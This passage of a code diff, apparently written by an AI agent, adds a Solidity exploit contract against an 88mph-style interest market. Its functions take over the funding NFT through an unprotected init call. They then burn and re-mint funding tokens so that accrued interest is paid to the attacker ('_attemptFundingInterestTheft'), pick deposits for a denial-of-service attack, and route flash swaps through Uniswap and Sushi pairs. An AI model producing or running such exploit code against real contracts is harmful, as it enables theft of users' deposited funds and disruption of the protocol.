+        uint256 stableNeeded;
+        try IUniswapV2RouterLike(router).getAmountsIn(mphNeeded, path) returns (uint256[] memory amountsIn) {
+            stableNeeded = amountsIn[0];
+        } catch {
+            return;
+        }
+        if (stableNeeded == 0) {
+            return;
+        }
+
+        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
+        _expectedFlashPair = flashPair;
+        _flashStablecoin = _profitToken;
+        _flashMPH = mph;
+        _flashRouter = router;
+        _flashDepositNFT = depositNftAddr;
+        _flashMPHMinter = mphMinter;
+        _flashDepositID = depositID;
+        _flashFundingID = fundingID;
+        _flashUseEarly = useEarly;
+        _flashMPHNeeded = mphNeeded;
+        _flashBorrowedStable = borrowedStable;
+        _flashPathLength = path.length;
+        _flashPath0 = path.length > 0 ? path[0] : address(0);
+        _flashPath1 = path.length > 1 ? path[1] : address(0);
+        _flashPath2 = path.length > 2 ? path[2] : address(0);
+
+        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);
+        if (pair.token0() == _profitToken) {
+            pair.swap(borrowedStable, 0, address(this), hex"01");
+        } else if (pair.token1() == _profitToken) {
+            pair.swap(0, borrowedStable, address(this), hex"01");
+        } else {
+            _clearFlashContext();
+        }
+    }
+
+    function _attemptFundingInterestTheft(IDInterestLike market, address fundingNftAddr) internal {
+        INFTLike fundingNft = INFTLike(fundingNftAddr);
+        if (fundingNft.owner() != address(this)) {
+            fundingNft.init(address(this), "profit-funding", "PFUND");
+            if (fundingNft.owner() != address(this)) {
+                return;
+            }
+        }
+
+        uint256 currentIncomeIndex = IMoneyMarketLike(market.moneyMarket()).incomeIndex();
+        if (currentIncomeIndex == 0) {
+            return;
+        }
+
+        uint256 fundingID = _findMostProfitableFunding(market, fundingNft, linkedFundingId, currentIncomeIndex);
+        if (fundingID == 0) {
+            return;
+        }
+
+        fundingNft.burn(fundingID);
+        fundingNft.mint(address(this), fundingID);
+        market.payInterestToFunder(fundingID);
+        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+    }
+
+    function _findDepositDoSCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
+        internal
+        view
+        returns (uint256 depositID, uint256 fundingID, bool useEarly)
+    {
+        uint256 len = market.depositsLength();
+        for (uint256 i = 1; i <= len; i++) {
+            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
+                continue;
+            }
+            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
+            if (!deposit.active) {
+                continue;
+            }
+            uint256 linked = 0;
+            if (market.depositIsFunded(i)) {
+                linked = _findFundingForDeposit(market, i);
+                if (linked == 0) {
+                    continue;
+                }
+            }
+            return (i, linked, block.timestamp < deposit.maturationTimestamp);
+        }
+    }
+
+    function _findProfitDepositCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
+        internal
+        view
+        returns (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded)
+    {
+        uint256 len = market.depositsLength();
+        uint256 bestAmount = 0;
+        uint256 bestMPH = type(uint256).max;
+
+        for (uint256 i = 1; i <= len; i++) {
+            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
+                continue;
+            }
+
+            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
+            if (!deposit.active) {
+                continue;
+            }
+
+            bool early = block.timestamp < deposit.maturationTimestamp;
+            if (!early) {
+                continue;
+            }
+
+            uint256 linked = 0;
+            if (market.depositIsFunded(i)) {
+                // Prefer simpler unfunded positions to keep the execution route deterministic.
+                continue;
+            }
+
+            if (
+                deposit.mintMPHAmount < bestMPH ||
+                (deposit.mintMPHAmount == bestMPH && deposit.amount > bestAmount)
+            ) {
+                bestAmount = deposit.amount;
+                bestMPH = deposit.mintMPHAmount;
+                depositID = i;
+                fundingID = linked;
+                useEarly = true;
+                mphNeeded = deposit.mintMPHAmount;
+            }
+        }
+    }
+
+    function _findExistingFundingToken(IDInterestLike market, INFTLike fundingNft, uint256 avoidTokenId)
+        internal
+        view
+        returns (uint256 fundingID)
+    {
+        uint256 len = market.fundingListLength();
+        for (uint256 i = 1; i <= len; i++) {
+            if (i != avoidTokenId && _tokenExists(fundingNft, i)) {
+                return i;
+            }
+        }
+    }
+
+    function _findMostProfitableFunding(
+        IDInterestLike market,
+        INFTLike fundingNft,
+        uint256 avoidTokenId,
+        uint256 currentIncomeIndex
+    ) internal view returns (uint256 bestFundingID) {
+        uint256 len = market.fundingListLength();
+        uint256 bestInterest = 0;
+
+        for (uint256 i = 1; i <= len; i++) {
+            if (i == avoidTokenId || !_tokenExists(fundingNft, i)) {
+                continue;
+            }
+            IDInterestLike.Funding memory funding = market.getFunding(i);
+            if (
+                funding.recordedFundedDepositAmount == 0 ||
+                funding.recordedMoneyMarketIncomeIndex == 0 ||
+                currentIncomeIndex <= funding.recordedMoneyMarketIncomeIndex
+            ) {
+                continue;
+            }
+
+            uint256 estimatedInterest =
+                (funding.recordedFundedDepositAmount * currentIncomeIndex) /
+                funding.recordedMoneyMarketIncomeIndex - funding.recordedFundedDepositAmount;
+            if (estimatedInterest > bestInterest) {
+                bestInterest = estimatedInterest;
+                bestFundingID = i;
+            }
+        }
+    }
+
+    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
+        uint256 len = market.fundingListLength();
+        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
+            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
+            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
+                return fundingID;
+            }
+        }
+        return 0;
+    }
+
+    function _locateFlashswapPlan(address stablecoin, address mph)
+        internal
+        view
+        returns (address flashPair, address router, address[] memory path)
+    {
+        address uniBorrowPair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(stablecoin, WETH);
+        if (uniBorrowPair != address(0)) {
+            (router, path) = _routeForBorrowDex(false, stablecoin, mph);
+            if (router != address(0)) {
+                return (uniBorrowPair, router, path);
+            }
+        }
+
+        address sushiBorrowPair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(stablecoin, WETH);
+        if (sushiBorrowPair != address(0)) {
+            (router, path) = _routeForBorrowDex(true, stablecoin, mph);
+            if (router != address(0)) {
+                return (sushiBorrowPair, router, path);
+            }
+        }
+
+        path = new address[](0);
+    }
+
+    function _routeForBorrowDex(bool borrowIsSushi, address stablecoin, address mph)
+        internal
+        view
+        returns (address router, address[] memory path)
+    {
+        if (borrowIsSushi) {
+            (router, path) = _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, true);
+            if (router != address(0)) {
+                return (router, path);
+            }
+            return _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, false);
+        }
+
+        (router, path) = _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, true);
+        if (router != address(0)) {
+            return (router, path);
+        }
+        return _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, false);
+    }
+
+    function _routeOnDex(
+        address factory,
+        address router,
+        address stablecoin,
+        address mph,
+        bool allowViaWETH
+    ) internal view returns (address, address[] memory path) {
+        if (IUniswapV2FactoryLike(factory).getPair(stablecoin, mph) != address(0)) {
+            path = new address[](2);
+            path[0] = stablecoin;
+            path[1] = mph;
+            return (router, path);
+        }
+
+        if (
+            allowViaWETH &&
+            IUniswapV2FactoryLike(factory).getPair(stablecoin, WETH) != address(0) &&
+            IUniswapV2FactoryLike(factory).getPair(WETH, mph) != address(0)
+        ) {
+            path = new address[](3);
+            path[0] = stablecoin;
+            path[1] = WETH;
+            path[2] = mph;
+            return (router, path);
+        }
+
+        path = new address[](0);
+        return (address(0), path);
+    }
+
+    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
+        try nft.ownerOf(tokenId) returns (address owner_) {
+            return owner_ != address(0);
+        } catch {
+            return false;
+        }
+    }
+
+    function _ownerQueryReverts(INFTLike nft, uint256 tokenId) internal view returns (bool) {
+        try nft.ownerOf(tokenId) returns (address owner_) {
+            return owner_ == address(0);
+        } catch {
+            return true;
+        }
+    }
+
+    function _sameTokenFlashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
+        return (borrowedAmount * 1000) / 997 + 1;
+    }
+
+    function _clearFlashContext() internal {
+        _expectedFlashPair = address(0);
+        _flashStablecoin = address(0);
+        _flashMPH = address(0);
+        _flashRouter = address(0);
+        _flashDepositNFT = address(0);
+        _flashMPHMinter = address(0);
+        _flashDepositID = 0;
+        _flashFundingID = 0;
+        _flashUseEarly = false;
+        _flashMPHNeeded = 0;
+        _flashBorrowedStable = 0;
+        _flashPathLength = 0;
+        _flashPath0 = address(0);
+        _flashPath1 = address(0);
+        _flashPath2 = address(0);
+    }
+
+    function _approveToken(address token, address spender, uint256 amount) internal {
+        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, 0));
+        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve reset failed");
+        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+
+    function _callWithdraw(address market, uint256 depositID, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("withdraw(uint256,uint256)", depositID, fundingID)
+        );
+        return (!ok, data);
+    }
+
+    function _callEarlyWithdraw(address market, uint256 depositID, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("earlyWithdraw(uint256,uint256)", depositID, fundingID)
+        );
+        return (!ok, data);
+    }
+
+    function _callPayInterestToFunder(address market, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("payInterestToFunder(uint256)", fundingID)
+        );
+        return (!ok, data);
+    }
+}
+tokens used
+85,349
